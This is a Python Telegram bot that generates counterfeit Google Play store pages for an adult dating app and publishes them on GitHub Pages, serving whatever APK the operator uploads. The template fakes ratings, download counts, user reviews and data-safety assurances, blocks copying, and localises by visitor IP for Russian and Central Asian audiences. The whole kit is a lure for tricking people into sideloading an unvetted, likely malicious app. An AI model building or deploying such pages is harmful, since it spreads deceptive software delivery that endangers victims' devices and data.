import os
import json
import base64
import random
import string
import asyncio
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ====== НАСТРОЙКИ ======
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
GITHUB_USER = os.getenv("GITHUB_USER", "jdnfhdifj1")
GITHUB_REPO = os.getenv("GITHUB_REPO", "apps")

GITHUB_API = "https://api.github.com"
HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ====== СОСТОЯНИЯ ======
class CreateLanding(StatesGroup):
    waiting_name = State()
    waiting_icon = State()
    waiting_screenshots = State()
    waiting_apk = State()

# ====== ХРАНИЛИЩЕ ЛЕНДИНГОВ ======
# landing_id -> { name, icon_b64, screenshots, apk_name, url }
landings_db = {}
user_screenshots = {}  # temp storage during creation

# ====== ГЕНЕРАЦИЯ ID ======
def gen_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

# ====== GITHUB: загрузить файл ======
async def github_upload(path: str, content_bytes: bytes, message: str = "upload"):
    url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{path}"
    timeout = aiohttp.ClientTimeout(total=600)
    
    async with aiohttp.ClientSession(timeout=timeout) as session:
        # Проверяем sha если файл существует
        sha = None
        async with session.get(url, headers=HEADERS) as resp:
            if resp.status == 200:
                data = await resp.json()
                sha = data.get("sha")
        
        payload = {
            "message": message,
            "content": base64.b64encode(content_bytes).decode()
        }
        if sha:
            payload["sha"] = sha
        
        async with session.put(url, headers=HEADERS, json=payload) as resp:
            result = resp.status in (200, 201)
            if not result:
                text = await resp.text()
                print(f"GitHub upload error {resp.status}: {text}")
            return result

# ====== GITHUB: инициализировать репозиторий ======
async def init_repo():
    """Создаёт первый файл если репо пустой"""
    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        # Проверяем есть ли main branch
        ref_url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/git/refs/heads/main"
        async with session.get(ref_url, headers=HEADERS) as resp:
            if resp.status == 200:
                return  # уже есть
        
        # Создаём первый файл
        url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/README.md"
        payload = {
            "message": "init",
            "content": base64.b64encode(b"# Apps").decode()
        }
        async with session.put(url, headers=HEADERS, json=payload) as resp:
            pass
async def enable_pages():
    url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/pages"
    payload = {"source": {"branch": "main", "path": "/"}}
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=HEADERS, json=payload) as resp:
            pass  # может вернуть 409 если уже включено — ок

# ====== ГЕНЕРАЦИЯ HTML ======
def generate_html(landing_id: str, name: str, icon_b64: str, screenshots_b64: list, apk_filename: str) -> str:
    screenshots_html = ""
    for sc in screenshots_b64:
        screenshots_html += f'<div class="sc-wrap"><img src="data:image/jpeg;base64,{sc}" alt="screenshot"></div>\n'

    html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>{name}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&family=Google+Sans:wght@400;500;700&display=swap');
* {{ margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; user-select:none; -webkit-user-select:none; -moz-user-select:none; -ms-user-select:none; }}
body {{ font-family:'Roboto',sans-serif; background:#fff; color:#202124; max-width:412px; margin:0 auto; overflow-x:hidden; font-size:14px; }}
.topbar {{ display:flex; align-items:center; justify-content:space-between; padding:10px 4px 6px; }}
.icon-btn {{ width:48px; height:48px; display:flex; align-items:center; justify-content:center; border-radius:50%; cursor:pointer; border:none; background:none; }}
.app-header {{ padding:0 16px; }}
.publisher {{ color:#01875f; font-size:13px; margin-bottom:4px; }}
.app-title {{ font-size:22px; font-weight:400; line-height:1.3; color:#202124; margin-bottom:14px; }}
.stats-row {{ display:flex; align-items:center; margin-bottom:14px; }}
.app-icon {{ width:64px; height:64px; border-radius:16px; overflow:hidden; flex-shrink:0; margin-right:14px; border:1px solid rgba(0,0,0,0.1); }}
.app-icon img {{ width:100%; height:100%; object-fit:cover; display:block; }}
.stats-cells {{ display:flex; flex:1; }}
.stat-cell {{ flex:1; display:flex; flex-direction:column; align-items:center; justify-content:center; border-left:1px solid #e0e0e0; padding:2px 4px; min-width:0; }}
.stat-val {{ font-size:13px; font-weight:500; color:#202124; display:flex; align-items:center; gap:2px; white-space:nowrap; }}
.stat-sub {{ font-size:11px; color:#5f6368; margin-top:2px; display:flex; align-items:center; gap:2px; white-space:nowrap; }}
.info-i {{ width:13px; height:13px; border:1.5px solid #5f6368; border-radius:50%; display:inline-flex; align-items:center; justify-content:center; font-size:8px; font-style:italic; font-weight:700; color:#5f6368; flex-shrink:0; }}
.age-badge {{ border:1.5px solid #5f6368; border-radius:3px; padding:1px 4px; text-align:center; line-height:1.2; }}
.age-arc {{ font-size:7px; color:#5f6368; display:block; letter-spacing:0.5px; }}
.age-num {{ font-size:11px; font-weight:700; color:#202124; }}
.btn-row {{ display:flex; gap:8px; margin-bottom:6px; }}
.btn-install {{ flex:1; background:#01875f; color:white; border:none; border-radius:24px; padding:12px; font-size:15px; font-weight:500; font-family:'Roboto',sans-serif; cursor:pointer; letter-spacing:0.1px; }}
.btn-down {{ background:#01875f; color:white; border:none; border-radius:50%; width:48px; height:48px; display:flex; align-items:center; justify-content:center; cursor:pointer; flex-shrink:0; }}
.install-note {{ font-size:12px; color:#5f6368; margin-bottom:14px; }}
.screenshots {{ overflow-x:auto; display:flex; gap:8px; padding:0 16px 16px; scrollbar-width:none; }}
.screenshots::-webkit-scrollbar {{ display:none; }}
.sc-wrap {{ flex-shrink:0; width:148px; height:263px; border-radius:12px; overflow:hidden; border:1px solid #e0e0e0; }}
.sc-wrap img {{ width:100%; height:100%; object-fit:cover; display:block; }}
.divider-thick {{ height:8px; background:#f1f3f4; }}
.divider {{ height:1px; background:#e8eaed; margin:0 16px; }}
.section {{ padding:16px; }}
.sec-head {{ display:flex; align-items:center; justify-content:space-between; margin-bottom:8px; }}
.sec-title {{ font-size:18px; font-weight:500; color:#202124; }}
.about-text {{ font-size:14px; color:#202124; line-height:1.55; }}
.show-more {{ display:flex; align-items:center; gap:2px; color:#01875f; font-size:13px; font-weight:500; margin-top:10px; cursor:pointer; border:none; background:none; }}
.tags {{ display:flex; gap:8px; margin-top:12px; flex-wrap:wrap; }}
.tag {{ border:1px solid #dadce0; border-radius:20px; padding:7px 18px; font-size:13px; color:#202124; background:#fff; cursor:pointer; }}
.safety-item {{ display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f1f3f4; }}
.safety-item:last-child {{ border-bottom:none; }}
.safety-text {{ font-size:13px; color:#202124; }}
.rating-big {{ font-size:52px; font-weight:300; line-height:1; color:#202124; }}
.stars-row {{ display:flex; gap:2px; margin:4px 0 2px; }}
.star {{ font-size:16px; color:#202124; }}
.rating-count {{ font-size:12px; color:#5f6368; }}
.rating-bars {{ flex:1; display:flex; flex-direction:column; gap:4px; }}
.bar-row {{ display:flex; align-items:center; gap:6px; }}
.bar-num {{ font-size:11px; color:#5f6368; width:8px; text-align:right; }}
.bar-track {{ flex:1; height:4px; background:#e0e0e0; border-radius:2px; overflow:hidden; }}
.bar-fill {{ height:100%; background:#01875f; border-radius:2px; }}
.review-card {{ padding:14px 0; border-bottom:1px solid #f1f3f4; }}
.review-card:last-child {{ border-bottom:none; }}
.rev-header {{ display:flex; align-items:center; gap:10px; margin-bottom:6px; }}
.rev-avatar {{ width:32px; height:32px; border-radius:50%; overflow:hidden; flex-shrink:0; background:#e0e0e0; }}
.rev-avatar img {{ width:100%; height:100%; object-fit:cover; }}
.rev-name {{ font-size:13px; font-weight:500; flex:1; }}
.rev-menu {{ color:#5f6368; cursor:pointer; font-size:18px; }}
.rev-stars {{ display:flex; gap:1px; margin-bottom:2px; }}
.rev-star {{ font-size:13px; color:#202124; }}
.rev-date {{ font-size:12px; color:#5f6368; }}
.rev-text {{ font-size:13px; color:#202124; line-height:1.5; margin-top:6px; }}
.rev-helpful {{ font-size:12px; color:#5f6368; margin-top:8px; }}
.rev-btns {{ display:flex; gap:8px; margin-top:8px; }}
.rev-btn {{ border:1px solid #dadce0; border-radius:20px; padding:5px 16px; font-size:12px; color:#202124; background:#fff; cursor:pointer; }}
.support-link {{ display:flex; align-items:center; gap:12px; padding:12px 0; text-decoration:none; color:#202124; border-bottom:1px solid #f1f3f4; }}
.support-link:last-child {{ border-bottom:none; }}
.support-link-text {{ font-size:14px; }}
.flag-row {{ display:flex; align-items:center; gap:8px; padding:12px 0; color:#5f6368; font-size:13px; cursor:pointer; }}
.footer {{ background:#f8f9fa; padding:16px; font-size:11px; color:#5f6368; line-height:2; }}
.footer a {{ color:#5f6368; text-decoration:none; }}
.bottom-nav {{ position:fixed; bottom:0; left:50%; transform:translateX(-50%); width:100%; max-width:412px; background:#fff; border-top:1px solid #e0e0e0; display:flex; justify-content:space-around; padding:6px 0 10px; z-index:100; }}
.nav-item {{ display:flex; flex-direction:column; align-items:center; gap:3px; cursor:pointer; padding:4px 8px; min-width:56px; }}
.nav-label {{ font-size:11px; color:#5f6368; }}
.spacer {{ height:80px; }}
</style>
</head>
<body>

<div class="topbar">
  <button class="icon-btn"><svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="#5f6368"/></svg></button>
  <button class="icon-btn"><svg width="5" height="21" viewBox="0 0 5 21" fill="#5f6368"><circle cx="2.5" cy="2.5" r="2.5"/><circle cx="2.5" cy="10.5" r="2.5"/><circle cx="2.5" cy="18.5" r="2.5"/></svg></button>
</div>

<div class="app-header">
  <div class="publisher">SEX GROUP</div>
  <div class="app-title" data-i18n="title">{name}</div>
  <div class="stats-row">
    <div class="app-icon"><img src="data:image/jpeg;base64,{icon_b64}" alt="icon"></div>
    <div class="stats-cells">
      <div class="stat-cell">
        <div class="stat-val">4,2 <span>★</span></div>
        <div class="stat-sub"><span data-i18n="reviews">529К отзывов</span> <span class="info-i">i</span></div>
      </div>
      <div class="stat-cell">
        <div class="stat-val">10М+</div>
        <div class="stat-sub" data-i18n="downloads">Загрузок</div>
      </div>
      <div class="stat-cell">
        <div class="stat-val"><div class="age-badge"><span class="age-arc">ARC</span><span class="age-num">18+</span></div></div>
        <div class="stat-sub" data-i18n="rated">Для 18+</div>
      </div>
    </div>
  </div>
  <div class="btn-row">
    <a id="apk-link" href="{apk_filename}" download="{apk_filename}" style="flex:1;text-decoration:none">
      <button class="btn-install" data-i18n="install">Установить</button>
    </a>
    <button class="btn-down"><svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M7 10l5 5 5-5z"/></svg></button>
  </div>
  <div class="install-note" style="display:flex;gap:12px">
    <span style="cursor:pointer;color:#01875f;font-size:13px;font-weight:500" data-i18n="share">Поделиться</span>
    <span style="cursor:pointer;color:#01875f;font-size:13px;font-weight:500" data-i18n="wishlist">В список желаний</span>
  </div>
</div>

<div class="screenshots">
{screenshots_html}
</div>

<div class="divider-thick"></div>

<div class="section">
  <div class="sec-head"><div class="sec-title" data-i18n="about">О приложении</div></div>
  <div class="about-text"><b data-i18n="about_title">Найди кого-то особенного рядом с тобой.</b><br><br><span data-i18n="about_text">Никаких обязательств — только живое общение и реальные встречи. Тысячи анкет, умный подбор и удобный чат.</span></div>
  <button class="show-more"><span data-i18n="more">ещё</span> <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M6 9l6 6 6-6" stroke="#01875f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
  <div class="tags"><div class="tag" data-i18n="tag">Знакомства</div></div>
</div>

<div class="divider-thick"></div>

<div class="section">
  <div class="sec-head"><div class="sec-title" data-i18n="data_safety">Безопасность данных</div></div>
  <div style="font-size:13px;color:#5f6368;margin-bottom:14px" data-i18n="data_safety_desc">Безопасность начинается с понимания того, как разработчики собирают и передают ваши данные.</div>
  <div class="safety-item"><svg class="safety-icon" viewBox="0 0 24 24" fill="none"><path d="M12 2L4 6v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V6l-8-4z" fill="#01875f"/></svg><div class="safety-text" data-i18n="safety1">Данные зашифрованы при передаче</div></div>
  <div class="safety-item"><svg class="safety-icon" viewBox="0 0 24 24" fill="none"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z" fill="#5f6368"/></svg><div class="safety-text" data-i18n="safety2">Вы можете запросить удаление своих данных</div></div>
  <button class="show-more" style="margin-top:4px" data-i18n="see_details">Подробнее</button>
</div>

<div class="divider-thick"></div>

<div class="section">
  <div class="sec-head"><div class="sec-title" data-i18n="ratings">Оценки и отзывы</div></div>
  <div style="display:flex;gap:16px;align-items:center;margin-bottom:16px">
    <div style="text-align:center">
      <div class="rating-big">4,2</div>
      <div class="stars-row">★★★★<span style="color:#dadce0">★</span></div>
      <div class="rating-count" data-i18n="reviews_count">529К отзывов</div>
    </div>
    <div class="rating-bars">
      <div class="bar-row"><span class="bar-num">5</span><div class="bar-track"><div class="bar-fill" style="width:55%"></div></div></div>
      <div class="bar-row"><span class="bar-num">4</span><div class="bar-track"><div class="bar-fill" style="width:20%"></div></div></div>
      <div class="bar-row"><span class="bar-num">3</span><div class="bar-track"><div class="bar-fill" style="width:10%"></div></div></div>
      <div class="bar-row"><span class="bar-num">2</span><div class="bar-track"><div class="bar-fill" style="width:5%"></div></div></div>
      <div class="bar-row"><span class="bar-num">1</span><div class="bar-track"><div class="bar-fill" style="width:10%"></div></div></div>
    </div>
  </div>

  <div class="review-card">
    <div class="rev-header"><div class="rev-avatar"><img src="https://play-lh.googleusercontent.com/a-/ALV-UjWwtEVe-tCN3NDDAFjcQxUMWG60I4yPQ3hyOsDXSb_KqUAaQ0KX1A=s32" alt=""></div><div class="rev-name">Алексей Морозов</div><div class="rev-menu">⋮</div></div>
    <div class="rev-stars">★★★★★</div>
    <div class="rev-date">14 апреля 2026 г.</div>
    <div class="rev-text">Отличное приложение! Познакомился с девушкой уже на второй день. Много активных анкет, интерфейс простой и удобный.</div>
    <div class="rev-helpful">214 человек нашли этот отзыв полезным</div>
    <div class="rev-btns"><button class="rev-btn">Да</button><button class="rev-btn">Нет</button></div>
  </div>

  <div class="review-card">
    <div class="rev-header"><div class="rev-avatar"><img src="https://play-lh.googleusercontent.com/a-/ALV-UjUOpsHZ5zt3B3qBDhwzfrF7JQIzf__CQFRUKs2hQyjQJ7GW0-uQ=s32" alt=""></div><div class="rev-name">Марина К.</div><div class="rev-menu">⋮</div></div>
    <div class="rev-stars">★★★★<span style="color:#dadce0">★</span></div>
    <div class="rev-date">2 апреля 2026 г.</div>
    <div class="rev-text">Пользуюсь уже месяц. Много интересных знакомств, приятное общение. Рекомендую!</div>
    <div class="rev-helpful">87 человек нашли этот отзыв полезным</div>
    <div class="rev-btns"><button class="rev-btn">Да</button><button class="rev-btn">Нет</button></div>
  </div>

  <div class="review-card">
    <div class="rev-header"><div class="rev-avatar"><img src="https://play-lh.googleusercontent.com/a-/ALV-UjW9UPtGQ1rWR0AXAaOOPOR3ABqLkRUYjSJRJa3MVNfC2XCXQpQ-=s32" alt=""></div><div class="rev-name">Дмитрий Волков</div><div class="rev-menu">⋮</div></div>
    <div class="rev-stars">★★★<span style="color:#dadce0">★★</span></div>
    <div class="rev-date">21 марта 2026 г.</div>
    <div class="rev-text">Анкет много, девушки реальные, общение живое. За полгода встретил нескольких интересных людей.</div>
    <div class="rev-helpful">43 человека нашли этот отзыв полезным</div>
    <div class="rev-btns"><button class="rev-btn">Да</button><button class="rev-btn">Нет</button></div>
  </div>

  <button class="show-more" style="margin-top:4px" data-i18n="all_reviews">Все отзывы</button>
</div>

<div class="spacer"></div>

<div class="bottom-nav">
  <div class="nav-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="#5f6368"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span class="nav-label" data-i18n="nav_home">Главная</span></div>
  <div class="nav-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="#5f6368"><path d="M21 6H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-10 7H8v3H6v-3H3v-2h3V8h2v3h3v2zm4.5 2c-.83 0-1.5-.67-1.5-1.5v-5c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5v5c0 .83-.67 1.5-1.5 1.5zm4-1c0 .55-.45 1-1 1s-1-.45-1-1V9c0-.55.45-1 1-1s1 .45 1 1v5z"/></svg><span class="nav-label" data-i18n="nav_games">Игры</span></div>
  <div class="nav-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="#01875f"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg><span class="nav-label" style="color:#01875f" data-i18n="nav_search">Поиск</span></div>
  <div class="nav-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="#5f6368"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 14H8v-2h8v2zm0-4H8v-2h8v2zm0-4H8V6h8v2z"/></svg><span class="nav-label" data-i18n="nav_books">Книги</span></div>
</div>

<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('selectstart', e => e.preventDefault());
document.addEventListener('dragstart', e => e.preventDefault());
const translations = {{
  ru: {{ title:'{name}', reviews:'529К отзывов', rated:'Для 18+', downloads:'Загрузок', install:'Установить', share:'Поделиться', wishlist:'В список желаний', about:'О приложении', about_title:'Найди кого-то особенного рядом с тобой.', about_text:'Никаких обязательств — только живое общение и реальные встречи.', more:'ещё', tag:'Знакомства', data_safety:'Безопасность данных', data_safety_desc:'Безопасность начинается с понимания того, как разработчики собирают и передают ваши данные.', safety1:'Данные зашифрованы при передаче', safety2:'Вы можете запросить удаление своих данных', see_details:'Подробнее', ratings:'Оценки и отзывы', reviews_count:'529К отзывов', all_reviews:'Все отзывы', nav_home:'Главная', nav_games:'Игры', nav_search:'Поиск', nav_books:'Книги' }},
  en: {{ title:'{name}', reviews:'529K reviews', rated:'Rated 18+', downloads:'Downloads', install:'Install', share:'Share', wishlist:'Add to wishlist', about:'About this app', about_title:'Find someone special near you.', about_text:'No strings attached — just real conversations and real dates.', more:'more', tag:'Dating', data_safety:'Data safety', data_safety_desc:'Safety starts with understanding how developers collect and share your data.', safety1:'Data is encrypted in transit', safety2:'You can request that data be deleted', see_details:'See details', ratings:'Ratings & reviews', reviews_count:'529K reviews', all_reviews:'See all reviews', nav_home:'Home', nav_games:'Games', nav_search:'Search', nav_books:'Books' }},
  kk: {{ title:'{name}', reviews:'529К пікір', rated:'18+ жас', downloads:'Жүктеу', install:'Орнату', share:'Бөлісу', wishlist:'Тілек тізіміне қосу', about:'Қолданба туралы', about_title:'Жақын жерден ерекше біреуді тап.', about_text:'Міндеттемесіз — тек тірі қарым-қатынас және нақты кездесулер.', more:'көбірек', tag:'Танысу', data_safety:'Деректер қауіпсіздігі', data_safety_desc:'Қауіпсіздік деректердің қалай жиналатынын түсінуден басталады.', safety1:'Деректер тасымалда шифрланған', safety2:'Деректерді жоюды сұрай аласыз', see_details:'Толығырақ', ratings:'Бағалар мен пікірлер', reviews_count:'529К пікір', all_reviews:'Барлық пікірлер', nav_home:'Басты', nav_games:'Ойындар', nav_search:'Іздеу', nav_books:'Кітаптар' }},
  uz: {{ title:'{name}', reviews:'529K sharh', rated:'18+ yosh', downloads:'Yuklamalar', install:"O'rnatish", share:'Ulashish', wishlist:"Istaklarga qo'shish", about:'Ilova haqida', about_title:'Yaqin atrofda kimnidir toping.', about_text:"Hech qanday majburiyat yo'q — faqat jonli muloqot va real uchrashuvlar.", more:"ko'proq", tag:'Tanishish', data_safety:"Ma'lumotlar xavfsizligi", data_safety_desc:"Xavfsizlik ma'lumotlar qanday yig'ilishini tushunishdan boshlanadi.", safety1:"Ma'lumotlar uzatishda shifrlangan", safety2:"Ma'lumotlarni o'chirishni so'rashingiz mumkin", see_details:'Batafsil', ratings:'Reytinglar va sharhlar', reviews_count:'529K sharh', all_reviews:'Barcha sharhlar', nav_home:'Asosiy', nav_games:"O'yinlar", nav_search:'Qidiruv', nav_books:'Kitoblar' }}
}};
const countryLang = {{RU:'ru',BY:'ru',KG:'ru',TJ:'ru',UA:'ru',KZ:'kk',UZ:'uz',TM:'uz',US:'en',GB:'en',CA:'en',AU:'en'}};
function applyLang(lang) {{
  const t = translations[lang] || translations.ru;
  document.querySelectorAll('[data-i18n]').forEach(el => {{ if(t[el.dataset.i18n]) el.textContent = t[el.dataset.i18n]; }});
}}
fetch('https://ip-api.com/json/?fields=countryCode').then(r=>r.json()).then(d=>applyLang(countryLang[d.countryCode]||'ru')).catch(()=>applyLang('ru'));
</script>
</body>
</html>"""
    return html


# ====== КОМАНДЫ ======
@dp.message(Command("start"))
async def cmd_start(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать лендинг", callback_data="create")],
        [InlineKeyboardButton(text="📋 Мои лендинги", callback_data="mylandings")]
    ])
    await message.answer(
        "👋 Привет! Я бот для создания лендингов.\n\n"
        "Что хочешь сделать?",
        reply_markup=kb
    )

@dp.callback_query(F.data == "create")
async def start_create(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("📝 Введи название приложения:")
    await state.set_state(CreateLanding.waiting_name)
    await callback.answer()

@dp.message(CreateLanding.waiting_name)
async def got_name(message: Message, state: FSMContext):
    await state.update_data(name=message.text)
    await message.answer("🖼 Отправь иконку (фото):")
    await state.set_state(CreateLanding.waiting_icon)

@dp.message(CreateLanding.waiting_icon, F.photo)
async def got_icon(message: Message, state: FSMContext):
    file = await bot.get_file(message.photo[-1].file_id)
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file.file_path}") as resp:
            icon_bytes = await resp.read()
    icon_b64 = base64.b64encode(icon_bytes).decode()
    await state.update_data(icon_b64=icon_b64)
    user_screenshots[message.from_user.id] = []
    await message.answer("📸 Отправь скриншоты (по одному). Когда закончишь — напиши /done")
    await state.set_state(CreateLanding.waiting_screenshots)

@dp.message(CreateLanding.waiting_screenshots, F.photo)
async def got_screenshot(message: Message, state: FSMContext):
    file = await bot.get_file(message.photo[-1].file_id)
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file.file_path}") as resp:
            sc_bytes = await resp.read()
    sc_b64 = base64.b64encode(sc_bytes).decode()
    user_screenshots[message.from_user.id].append(sc_b64)
    count = len(user_screenshots[message.from_user.id])
    await message.answer(f"✅ Скриншот {count} добавлен. Ещё или /done")

@dp.message(CreateLanding.waiting_screenshots, Command("done"))
async def screenshots_done(message: Message, state: FSMContext):
    await message.answer("📦 Отправь APK файл:")
    await state.set_state(CreateLanding.waiting_apk)

@dp.message(CreateLanding.waiting_apk, F.document)
async def got_apk(message: Message, state: FSMContext):
    await message.answer("⏳ Загружаю на GitHub... Это может занять 1-2 минуты для большого APK файла.")
    
    data = await state.get_data()
    name = data["name"]
    icon_b64 = data["icon_b64"]
    screenshots = user_screenshots.get(message.from_user.id, [])
    
    # Скачиваем APK с увеличенным таймаутом
    file = await bot.get_file(message.document.file_id)
    timeout = aiohttp.ClientTimeout(total=300)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file.file_path}") as resp:
            apk_bytes = await resp.read()
    
    apk_filename = message.document.file_name or "app.apk"
    landing_id = gen_id()
    
    # Инициализируем репо если нужно
    await init_repo()
    
    # Генерируем HTML
    html = generate_html(landing_id, name, icon_b64, screenshots, apk_filename)
    
    await message.answer("📄 HTML готов, загружаю файлы...")
    
    # Загружаем HTML
    ok1 = await github_upload(f"{landing_id}/index.html", html.encode(), f"Add landing {landing_id}")
    if not ok1:
        await message.answer("❌ Ошибка загрузки HTML. Попробуй ещё раз.")
        await state.clear()
        return
    
    await message.answer("📦 APK загружается...")
    
    # Загружаем APK
    ok2 = await github_upload(f"{landing_id}/{apk_filename}", apk_bytes, f"Add APK for {landing_id}")
    
    # Включаем Pages
    await enable_pages()
    
    if ok2:
        url = f"https://{GITHUB_USER}.github.io/{GITHUB_REPO}/{landing_id}/"
        
        # Сохраняем в БД
        user_id = str(message.from_user.id)
        if user_id not in landings_db:
            landings_db[user_id] = []
        landings_db[user_id].append({
            "id": landing_id,
            "name": name,
            "url": url,
            "apk": apk_filename
        })
        
        import io
        from aiogram.types import BufferedInputFile
        html_file = BufferedInputFile(html.encode(), filename=f"{landing_id}.html")
        
        await message.answer_document(
            document=html_file,
            caption=f"✅ Лендинг создан!\n\n🔗 Ссылка: {url}\n\n⚠️ GitHub Pages активируется за 2-3 минуты"
        )
    else:
        await message.answer("❌ Ошибка загрузки APK. Попробуй ещё раз.")
    
    await state.clear()

@dp.callback_query(F.data == "mylandings")
async def my_landings(callback: CallbackQuery):
    user_id = str(callback.from_user.id)
    landings = landings_db.get(user_id, [])
    
    if not landings:
        await callback.message.answer("У тебя пока нет лендингов. Создай первый!")
        await callback.answer()
        return
    
    buttons = []
    for l in landings:
        buttons.append([InlineKeyboardButton(text=f"📱 {l['name']}", callback_data=f"landing_{l['id']}")])
    
    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    await callback.message.answer("📋 Твои лендинги:", reply_markup=kb)
    await callback.answer()

@dp.callback_query(F.data.startswith("landing_"))
async def landing_detail(callback: CallbackQuery):
    landing_id = callback.data.replace("landing_", "")
    user_id = str(callback.from_user.id)
    landings = landings_db.get(user_id, [])
    
    landing = next((l for l in landings if l["id"] == landing_id), None)
    if not landing:
        await callback.message.answer("Лендинг не найден.")
        await callback.answer()
        return
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Получить HTML", callback_data=f"gethtml_{landing_id}")]
    ])
    
    await callback.message.answer(
        f"📱 *{landing['name']}*\n\n🔗 {landing['url']}",
        reply_markup=kb,
        parse_mode="Markdown"
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("gethtml_"))
async def get_html(callback: CallbackQuery):
    landing_id = callback.data.replace("gethtml_", "")
    
    # Скачиваем HTML с GitHub
    url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{landing_id}/index.html"
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=HEADERS) as resp:
            if resp.status == 200:
                data = await resp.json()
                html_bytes = base64.b64decode(data["content"])
                
                from aiogram.types import BufferedInputFile
                html_file = BufferedInputFile(html_bytes, filename=f"{landing_id}.html")
                await callback.message.answer_document(document=html_file, caption="Вот твой HTML файл!")
            else:
                await callback.message.answer("Не удалось получить файл с GitHub.")
    
    await callback.answer()

# ====== ЗАПУСК ======
async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
